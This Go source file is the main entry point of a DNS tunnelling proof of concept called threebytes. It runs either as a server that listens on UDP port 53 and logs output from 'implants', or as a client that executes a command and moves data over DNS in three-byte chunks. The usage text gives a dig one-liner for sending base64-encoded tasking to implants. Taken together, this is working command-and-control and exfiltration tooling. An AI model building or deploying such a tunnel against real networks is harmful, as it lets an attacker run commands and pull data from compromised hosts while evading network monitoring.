// threebytes is a simple DNS Tunneling PoC which sends data in three-byte
// chunks.
package main

/*
 * threebytes.go
 * DNS tunnel, three bytes at a time
 * By J. Stuart McMurray
 * Created 201801107
 * Last Modified 201801107
 */

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
)

func main() {
	var (
		beClient = flag.String(
			"client",
			"",
			"Don't be a server, be a client with the given `ID`",
		)
		domain = flag.String(
			"domain",
			"",
			"DNS `domain`",
		)
		firstByte = flag.Uint(
			"first-byte",
			17,
			"Sets the first `octet` of the returned A records",
		)
		laddr = flag.String(
			"laddr",
			"0.0.0.0:53",
			"Listen `address` (for use with -server)",
		)
		offset = flag.Uint(
			"offset",
			0x1F600,
			"Punycode offset",
		)
		cbLen = flag.Uint(
			"random-cachebust-len",
			13,
			"Number of hex digits of cachebusting length",
		)
		logFilter = flag.String(
			"log-filter",
			"",
			"Filters log output for the given client `ID`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]
       %v -client [options] command [arg [arg...]]
       %v -log-filter ID

Acts either as the server or client (with -client) side of a DNS tunnel.

The server will log output from all implants to stdout.

With -log-filter, log data is read from stdin (e.g. with tail -f) and filtered
to produce output for the client with the given ID.

Tasking:
dig @localhost a.$(echo $TASKING | base64 -e | tr -d '=').tasking

Options:
`,
			os.Args[0],
			os.Args[0],
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Filter logs if we ought */
	if "" != *logFilter {
		filter(*logFilter)
		return
	}

	/* If we're meant to be a client, do so */
	if "" != *beClient {
		client(*beClient, *domain, *offset, *cbLen)
		return
	}

	/* Make sure our first byte is small enough */
	if 0xFF < *firstByte {
		log.Fatalf("First byte must be less than 256")
	}

	/* Listen for and handle queries */
	pc, err := net.ListenPacket("udp", *laddr)
	if nil != err {
		log.Fatalf("Unable to listen: %v", err)
	}
	log.Printf("Listening for DNS queries on %v", pc.LocalAddr())
	for {
		buf := pool.Get().([]byte)
		n, addr, err := pc.ReadFrom(buf)
		if nil != err {
			log.Fatalf("Error reading packet: %v", err)
		}
		go func() {
			handle(pc, buf[:n], addr, *offset, byte(*firstByte))
			pool.Put(buf)
		}()
	}
}
